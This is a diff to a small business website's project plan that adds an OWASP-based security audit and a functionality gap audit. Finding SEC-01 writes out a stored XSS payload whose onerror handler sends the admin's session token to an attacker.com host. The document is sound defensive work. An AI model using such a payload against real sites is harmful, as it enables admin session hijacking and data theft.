@@ -1,6 +1,6 @@
 # Studio 37 Custom Designs — Open Work & Project Plan
 **Document type:** Project Management + Business Systems Analysis  
-**Last updated:** June 25, 2026  
+**Last updated:** June 25, 2026 (security audit added)  
 **Status:** Active — updated as work completes or scope changes
 
 ---
@@ -18,7 +18,9 @@
 10. [Third-Party Account Checklist](#10-third-party-account-checklist)
 11. [Environment Variables Reference](#11-environment-variables-reference)
 12. [DNS Migration Plan](#12-dns-migration-plan)
-13. [Decision Log](#13-decision-log)
+13. [Security Audit](#13-security-audit)
+14. [Functionality Gap Audit](#14-functionality-gap-audit)
+15. [Decision Log](#15-decision-log)
 
 ---
 
@@ -109,7 +111,7 @@ See [Section 11 — Environment Variables Reference](#11-environment-variables-r
 
 **Currently missing values (awaiting Drew):**
 - `TWILIO_SID`, `TWILIO_TOKEN`, `TWILIO_FROM`, `DREW_PHONE`
-- `R2_ACCOUNT_ID`, `R2_ACCESS_KEY_ID`, `R2_SECRET_ACCESS_KEY`, `R2_BUCKET`, `R2_PUBLIC_URL`
+- `R2_ACCOUNT_ID`, `R2_ACCESS_KEY`, `R2_SECRET_KEY`, `R2_BUCKET`, `R2_PUBLIC_BASE`
 - `STRIPE_WEBHOOK_SECRET` (connected-accounts), `STRIPE_WEBHOOK_SECRET_PLATFORM`
 - `RESEND_API_KEY` (Drew has the key; must be pasted into Netlify)
 
@@ -480,10 +482,10 @@ Full list of env vars expected by the Netlify Functions layer. All must be set i
 | `TWILIO_FROM` | ⬜ | Twilio console | Studio 37 Twilio number in E.164 format (`+1...`) |
 | `DREW_PHONE` | ⬜ | Drew | Drew's mobile in E.164 format (`+15415147720`) |
 | `R2_ACCOUNT_ID` | ⬜ | Cloudflare dashboard | Cloudflare Account ID |
-| `R2_ACCESS_KEY_ID` | ⬜ | Cloudflare R2 token | R2 API token access key |
-| `R2_SECRET_ACCESS_KEY` | ⬜ | Cloudflare R2 token | R2 API token secret |
+| `R2_ACCESS_KEY` | ⬜ | Cloudflare R2 token | R2 API token access key (`admin-upload.mjs` reads this name) |
+| `R2_SECRET_KEY` | ⬜ | Cloudflare R2 token | R2 API token secret (`admin-upload.mjs` reads this name) |
 | `R2_BUCKET` | ⬜ | Configure | Bucket name (e.g., `studio37-media`) |
-| `R2_PUBLIC_URL` | ⬜ | Configure | Public base URL for serving images (e.g., `https://media.studio37customdesigns.com`) |
+| `R2_PUBLIC_BASE` | ⬜ | Configure | Public base URL for serving images (e.g., `https://media.studio37customdesigns.com`) |
 | `SITE_URL` | ⬜ | Configure | `https://studio37customdesigns.com` — used for Stripe redirect URLs |
 
 **Legend:** ✅ = required at launch | ⬜ = required for that feature to work; site degrades gracefully without it
@@ -526,7 +528,275 @@ Add Resend records to existing Wix DNS. Site continues serving from Wix during t
 
 ---
 
-## 13. Decision Log
+## 13. Security Audit
+
+Full-stack security review conducted June 25, 2026. Methodology: manual code review across all Netlify Functions, frontend JavaScript, HTML, and infrastructure configuration against OWASP Top 10.
+
+### Overall Score: 6.5 / 10
+
+Good foundation — auth, rate-limiting, webhook verification, and input sanitization are all properly implemented. Three specific gaps need addressing before public launch, one of which is a confirmed stored XSS vulnerability in the admin panel.
+
+---
+
+### OWASP Top 10 — Assessment
+
+| # | Category | Status | Score | Notes |
+|---|---|---|---|---|
+| A01 | Broken Access Control | ✅ Pass | 9/10 | All admin endpoints session-gated via JWT. Role enforcement (`admin` vs `super`) on sensitive operations. No IDOR found. Soft delete prevents hard deletes. |
+| A02 | Cryptographic Failures | ✅ Pass | 8/10 | Passwords hashed with bcrypt (cost 10). JWT uses HS256 with minimum 16-char secret enforcement. No secrets in client-side code. HTTPS enforced by Netlify CDN (once custom domain connects). JWT TTL mismatch noted (see SEC-03). |
+| A03 | Injection | ⚠️ Fail | 4/10 | **Stored XSS in Admin Leads table** (SEC-01 — critical). No SQL injection risk (no SQL; Blobs are key-value). Server-side function inputs are sanitized. Email templates properly `escapeHtml` all user data. |
+| A04 | Insecure Design | ✅ Pass | 8/10 | Rate limiting on login (5/min IP, 10/10min email), quote form (3/hr IP, 5/day email). Honeypot on contact form. Stripe webhook signature verified before processing. Cart price re-validated server-side before Checkout. Webhook idempotency via order store check. |
+| A05 | Security Misconfiguration | ⚠️ Fail | 5/10 | **No Content-Security-Policy header** (SEC-02 — high). Missing HSTS. Has X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy. Legacy admin key fallback past removal date (SEC-04). |
+| A06 | Vulnerable & Outdated Components | ⚠️ Warn | 6/10 | `npm audit` reports 64 vulnerabilities (5 low, 29 moderate, 30 high). Most are in dev tooling (netlify-cli). Need triage to confirm none are in runtime dependencies (SEC-05). |
+| A07 | Identification & Authentication Failures | ✅ Pass | 7/10 | IP + email rate limiting on login. bcrypt password verification. No email enumeration on login (generic 401). `auth-request-access` has no rate limiting (SEC-06 — low). JWT TTL 7d vs 8h client expiry (SEC-03). |
+| A08 | Software & Data Integrity Failures | ✅ Pass | 9/10 | Stripe webhook signature verified with both platform + connected-account secrets. No unsigned data accepted from Stripe. |
+| A09 | Security Logging & Monitoring | ⚠️ Warn | 6/10 | Audit log exists (`admin-audit-log.mjs`) and is written to on product/order/settings changes. No UI surface in admin dashboard. No alerting on suspicious patterns. Reviews and leads mutations not logged. |
+| A10 | Server-Side Request Forgery | ✅ Pass | 9/10 | No user-supplied URLs are fetched server-side. Image URLs validated to `^https?://` with 1000-char cap in `admin-products.mjs`. Site-media PUT accepts any URL string (SEC-07 — low). |
+
+---
+
+### Security Issues — Prioritized
+
+---
+
+#### SEC-01 · Stored XSS in Admin Leads Table 🔴 CRITICAL
+**File:** `src/assets/js/admin.js` lines 706–712  
+**Exploitability:** High — any member of the public can trigger this via the contact form
+
+**Description:**  
+The Leads section in the admin dashboard renders user-submitted contact form data (firstName, lastName, phone, email, service) directly into `innerHTML` without HTML escaping. The Orders section and most other tables correctly use an `escapeHtml()` function defined at line 998, but Leads was missed.
+
+A malicious actor submits the contact form with a payload like `"><img src=x onerror="fetch('https://attacker.com/?t='+sessionStorage.getItem('studio37_session_token'))">` as their first name. When Drew opens Admin → Leads, the script executes in his authenticated session, exfiltrates his JWT token to the attacker, and the attacker gains full admin access.
+
+**Fix:** Wrap all lead field interpolations with `escapeHtml()`. Single line change per field.
+
+**Status:** ⬜ Not fixed — to be patched immediately
+
+---
+
+#### SEC-02 · Missing Content-Security-Policy Header 🟠 HIGH
+**File:** `netlify.toml` — `[[headers]]` section  
+**Description:**  
+No CSP header is set site-wide. Without CSP, any XSS that lands (like SEC-01) executes without restriction — can exfiltrate tokens, make authenticated API calls, redirect users, load external scripts.
+
+A well-configured CSP is the primary defense-in-depth control that limits XSS blast radius even when injection points exist.
+
+**Proposed policy (conservative, can tighten after testing):**
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https://api.stripe.com https://js.stripe.com; frame-src https://js.stripe.com; object-src 'none'; base-uri 'self'; form-action 'self';
+```
+
+Note: `'unsafe-inline'` is required for styles since we use inline style attributes extensively. Script inline is avoided (`'unsafe-inline'` NOT included for scripts). Stripe Checkout requires `frame-src` and `connect-src` for `js.stripe.com`.
+
+**Status:** ⬜ Not fixed — add to netlify.toml
+
+---
+
+#### SEC-03 · JWT Lifetime 7 Days vs 8-Hour Client Session 🟡 MEDIUM
+**File:** `src/netlify/functions/_lib/auth.mjs` line `const SESSION_TTL = '7d'`  
+**Description:**  
+JWT tokens are cryptographically valid for 7 days. The client-side session enforcer (in `admin.js`) expires idle sessions after 30 minutes and hard-expires at 8 hours. If a JWT is exfiltrated from `sessionStorage` (e.g., via SEC-01 before it's fixed), it remains valid for the full 7-day window.
+
+**Fix:** Change `SESSION_TTL` to `'9h'` (slightly above the 8-hour hard expiry to avoid race conditions at hour 8). This does not affect normal user experience — client-side expiry fires first — but closes the stolen-token window from 7 days to <1 hour.
+
+**Status:** ⬜ Not fixed
+
+---
+
+#### SEC-04 · Legacy Admin Key Fallback Past Removal Date 🟡 MEDIUM
+**File:** `src/netlify/functions/_lib/auth.mjs` lines 122–134  
+**Description:**  
+`LEGACY_ADMIN_KEY_FALLBACK` was documented for removal after `2026-06-30`. That date has passed. The fallback allows bypassing JWT auth with a static `X-Admin-Key` header if the env var is set to `'on'`. While it defaults to disabled (the env var is not `'on'` unless explicitly set), the dead code path should be removed to eliminate the risk of accidental re-enablement.
+
+**Fix:** Remove the legacy fallback block from `requireSession()` and the `requireAdmin()` helper in `store.mjs`. Remove `ADMIN_KEY` from env vars doc.
+
+**Status:** ⬜ Not fixed — remove after confirming `LEGACY_ADMIN_KEY_FALLBACK` is not set in Netlify
+
+---
+
+#### SEC-05 · npm Audit — 64 Vulnerabilities in Dependency Tree 🟡 MEDIUM
+**Command:** `npm audit`  
+**Description:**  
+`npm install` reported 64 vulnerabilities (5 low, 29 moderate, 30 high). The majority are almost certainly in `netlify-cli` (a dev dependency, never deployed to production), but this needs confirmed triage.
+
+**Fix:**
+1. Run `npm audit --omit=dev` to see only production runtime vulnerabilities.
+2. Patch any production runtime vulns via `npm audit fix`.
+3. Document the netlify-cli vulns as accepted dev-only risk.
+
+**Status:** ⬜ Needs triage
+
+---
+
+#### SEC-06 · `auth-request-access` Has No Rate Limiting 🟢 LOW
+**File:** `src/netlify/functions/auth-request-access.mjs`  
+**Description:**  
+Anyone can POST to `/api/auth/request-access` to create pending user records. There is no rate limit. While it doesn't expose sensitive data and the flow requires admin approval, it could be abused to flood the `users` Netlify Blobs store or spam the future admin notification (once SEC-07 TODO is addressed).
+
+**Fix:** Add the same rate-limit pattern used in `quote-request.mjs` — 3 requests/hour per IP, 5/day per email.
+
+**Status:** ⬜ Not fixed
+
+---
+
+#### SEC-07 · R2 Upload — No MIME Type Whitelist 🟢 LOW
+**File:** `src/netlify/functions/admin-upload.mjs`  
+**Description:**  
+The upload endpoint accepts any file type. The extension is loosely sanitized (`/[^a-z0-9]/g` stripped), but file types like `.html`, `.svg`, `.js`, `.pdf` would all pass. If R2 serves these files from a public domain (especially if on the same origin as the site), an attacker who gains admin access could upload an HTML file and use it as an XSS vector or phishing page.
+
+**Fix:** Add a MIME type whitelist:
+```javascript
+const ALLOWED_TYPES = new Set(['image/jpeg','image/png','image/webp','image/gif']);
+const ALLOWED_EXTS = new Set(['jpg','jpeg','png','webp','gif']);
+if (!ALLOWED_TYPES.has(file.type) || !ALLOWED_EXTS.has(ext)) {
+  return json({ error: 'unsupported_file_type' }, 400);
+}
+```
+Also add a file size cap (e.g., 10 MB).
+
+**Status:** ⬜ Not fixed
+
+---
+
+#### SEC-08 · R2 Env Var Name Mismatch 🔴 BUG (not security, but blocks upload)
+**File:** `src/netlify/functions/admin-upload.mjs` vs `docs/studio37_open_work.md`  
+**Description:**  
+`admin-upload.mjs` reads `R2_ACCESS_KEY` and `R2_SECRET_KEY`, but the environment variables section in this document lists them as `R2_ACCESS_KEY_ID` and `R2_SECRET_ACCESS_KEY`. If Netlify env vars are set using the document names, upload will silently return `storage_unavailable` even when credentials are correct.
+
+**Fix:** Standardize. Recommend aligning to the AWS SDK convention used in the code: `R2_ACCESS_KEY` and `R2_SECRET_KEY`. Update the env vars reference table in Section 11 accordingly.
+
+**Status:** ⬜ Not fixed — must resolve before R2 setup (P0-3)
+
+---
+
+#### SEC-09 · Admin Leads XSS — Reviews Table Also Unescaped 🟠 HIGH
+**File:** `src/assets/js/admin.js` line 589  
+**Description:**  
+The reviews table renders `r.name` and `r.location` without `escapeHtml`. Reviews are admin-created (Drew creates them in the dashboard), so direct public exploitation is blocked — an attacker would need existing admin access first. However it's still bad practice and should be fixed in the same pass as SEC-01.
+
+**Status:** ⬜ Not fixed alongside SEC-01
+
+---
+
+#### SEC-10 · No HSTS Header 🟢 LOW
+**File:** `netlify.toml`  
+**Description:**  
+HTTP Strict Transport Security forces browsers to always use HTTPS. Netlify enforces HTTPS at the CDN level, but adding the header locks browsers in for 1 year (prevents protocol downgrade attacks if CDN config ever changes).
+
+**Fix:** Add to `netlify.toml` headers section:
+```
+Strict-Transport-Security = "max-age=31536000; includeSubDomains"
+```
+
+**Status:** ⬜ Not fixed
+
+---
+
+### Security Fixes — Recommended Ship Order
+
+| Priority | Issue | Effort | Risk if unpatched |
+|---|---|---|---|
+| Fix now | SEC-01 Stored XSS (Leads) | 15 min | Drew's admin session stolen via contact form |
+| Fix now | SEC-09 Unescaped Reviews table | 5 min | Admin-only risk, fix with SEC-01 |
+| Before launch | SEC-02 Missing CSP | 30 min | XSS blast radius unlimited |
+| Before launch | SEC-08 R2 env var mismatch | 5 min | Image uploads broken even when configured |
+| Before launch | SEC-03 JWT 7d TTL | 5 min | Stolen tokens valid 7 days |
+| Before launch | SEC-05 npm audit triage | 1 hr | Unknown runtime exposure |
+| Before launch | SEC-10 HSTS | 5 min | Protocol downgrade edge case |
+| After launch | SEC-04 Legacy admin key | 30 min | Dead code risk |
+| After launch | SEC-06 request-access rate limit | 30 min | Blob store spam |
+| After launch | SEC-07 Upload MIME whitelist | 30 min | Non-image uploads to R2 |
+
+---
+
+## 14. Functionality Gap Audit
+
+Full audit of wired-but-not-working and missing functionality conducted June 25, 2026.
+
+---
+
+### GAP-01 · Admin Access Request — Drew Gets No Notification 🟡
+**File:** `src/netlify/functions/auth-request-access.mjs` line 41 (TODO comment)  
+**Description:** When someone requests admin access at `/admin`, a pending user record is created but Drew receives no email, SMS, or in-app alert. He would only see it by navigating to Admin → Users.  
+**Fix:** Call `sendLeadNotification`-style Resend email to Drew when a request is created. Small addition to `auth-request-access.mjs`.  
+**Effort:** ~30 min
+
+---
+
+### GAP-02 · Audit Log — No Admin UI Surface 🟡
+**File:** `src/netlify/functions/admin-audit-log.mjs` exists and is correct  
+**Description:** The audit log function is fully built and called by products/orders/settings mutations, but there is no tab or view in the admin dashboard to see it. Drew cannot review the audit trail without a raw API call.  
+**Fix:** Add an "Audit Log" section to `admin/dashboard.html` and a `loadAuditLog()` call in `admin.js`. Table showing: timestamp, actor, action, entity.  
+**Effort:** ~2 hours
+
+---
+
+### GAP-03 · Reviews & Leads Mutations Not Audit-Logged 🟢
+**File:** `admin-reviews.mjs`, `admin-leads.mjs`  
+**Description:** Product/order/settings mutations call `logAudit()`. Reviews CRUD and lead status changes do not.  
+**Fix:** Add `logAudit()` calls to review create/update/delete and any future lead status changes.  
+**Effort:** ~30 min
+
+---
+
+### GAP-04 · Site Settings Not Wired to Live Nav/Footer Copy 🟡
+**File:** `src/assets/js/site.js`, `src/netlify/functions/public-config.mjs`  
+**Description:** `public-config.mjs` returns live site settings (business name, phone, email, social URLs). The shared nav/footer HTML in `site.js` is hardcoded — it does not read from `/api/public-config`. So if Drew updates phone/email/social in the Admin → Settings panel, the footer still shows the old hardcoded values.  
+**Impact:** Admin Settings panel for contact info and social links has no visible effect on the public site.  
+**Fix:** Update `site.js` `mountChrome()` to fetch `/api/public-config` and interpolate settings into the footer template. Also wire Pinterest URL from settings (removes the hardcoded broken link).  
+**Effort:** ~1 hour
+
+---
+
+### GAP-05 · `show_gc_tile` Setting Does Nothing 🟢
+**File:** `src/netlify/functions/_lib/store.mjs` (SITE_SETTINGS_DEFAULTS includes `show_gc_tile`)  
+**Description:** The GC services tile and section are commented out in HTML for legal reasons (CCB license pending). The `show_gc_tile` setting in Admin → Settings exists but is never read by the public site — the tile would not appear even if set to true, because the HTML is commented out.  
+**Fix:** Not urgent — when CCB license arrives, un-comment the HTML and wire it to read `show_gc_tile` from public-config at the same time. Document that the current flow is intentional.  
+**Effort:** Minimal when CCB license is ready
+
+---
+
+### GAP-06 · Product Detail Page Missing Structured Data (Schema.org) 🟢
+**File:** `src/shop/product.html`, `src/assets/js/product-detail.js`  
+**Description:** Product detail pages have no `<script type="application/ld+json">` structured data. Google Product rich results require `Product` schema with `name`, `image`, `description`, `offers`. Missing this reduces organic search visibility for individual product pages.  
+**Fix:** Add `Product` JSON-LD block to `product-detail.js` after the product loads.  
+**Effort:** ~1 hour
+
+---
+
+### GAP-07 · Cart "Thank you" Message References Stripe Receipt (Incorrect) 🟢
+**File:** `src/assets/js/cart.js` line 370  
+**Description:** On a successful checkout redirect, the cart shows: `"Your order is in. You'll get a confirmation email from Stripe shortly."` — but Studio 37 now sends its own branded email. If Stripe receipts are also enabled (P1-4), the customer gets two emails. If only Studio 37 email is enabled, the message is slightly misleading ("from Stripe").  
+**Fix:** Update the message to: `"Your order is in. You'll receive a confirmation email shortly."` (remove "from Stripe").  
+**Effort:** 2 min
+
+---
+
+### GAP-08 · `/order/confirmed` Page Does Not Show Order Details 🟡
+**File:** `src/order/confirmed.html`  
+**Description:** The post-checkout confirmed page receives `?session_id=` in the URL but does not display any order details (items, total, etc.) to the customer. It's a static "thank you" page. Customers must wait for the email to see what they ordered.  
+**Fix:** Add a small JS fetch of `/api/stripe/checkout-session?session_id=...` (would need a new public endpoint) or rely on the Resend email confirmation as the order receipt. If the email is working, this is acceptable at launch. Long-term it's better UX to show the order on-page.  
+**Effort:** ~2 hours (requires new public endpoint to fetch session details safely)
+
+---
+
+### GAP-09 · `admin/index.html` (Login) Has No Rate Limit UI Feedback 🟢
+**File:** `src/admin/index.html`, `src/assets/js/admin-login.js`  
+**Description:** The server returns 429 with `retry_after` when login rate limit is hit. The login JS likely catches the error generically but may not show the retry timer clearly to the user.  
+**Fix:** Verify the login JS handles 429 and displays "Too many attempts — try again in X seconds" with the actual countdown. Low priority; admin audience, no public users.  
+**Effort:** ~30 min
+
+---
+
+### GAP-10 · No `robots.txt` Block on `/admin` 🟢
+**File:** `src/robots.txt`  
+**Description:** The admin dashboard at `/admin/*` should be disallowed in `robots.txt` to prevent search engines from indexing the login page or surfacing it in search results.  
+**Fix:** Add `Disallow: /admin/` to `robots.txt`.  
+**Effort:** 2 min
+
+---
+
+## 15. Decision Log
 
 | Date | Decision | Rationale |
 |---|---|---|
@@ -540,3 +810,4 @@ Add Resend records to existing Wix DNS. Site continues serving from Wix during t
 | Jun 2026 | Email provider: Resend | 3,000/mo free tier; simple API; good deliverability; native ESM SDK fits function architecture |
 | Jun 2026 | SMS provider: Twilio | Already coded into functions from original design; account not yet created |
 | Jun 2026 | Logo: switched to `logo.png` | `logo-mark.png` was rendering nearly invisible in nav; `logo.png` (267×217) has better contrast; size increased to 72px desktop |
+| Jun 2026 | SEC-01/SEC-09: escapeHtml gaps identified | Stored XSS in admin leads + reviews tables; fix queued as P0 |
